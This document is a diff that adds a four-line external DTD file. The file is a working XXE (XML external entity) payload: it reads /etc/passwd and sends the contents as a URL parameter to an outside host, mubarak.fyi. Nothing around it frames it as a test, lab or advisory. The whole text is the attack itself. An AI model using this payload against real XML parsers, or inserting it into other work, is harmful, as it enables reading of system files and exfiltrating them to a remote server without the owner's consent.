@@ -1,0 +1,4 @@
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://mubarak.fyi/static/payloads/xml-1.dtd?f=%file;'>">
+%eval;
+%exfil;
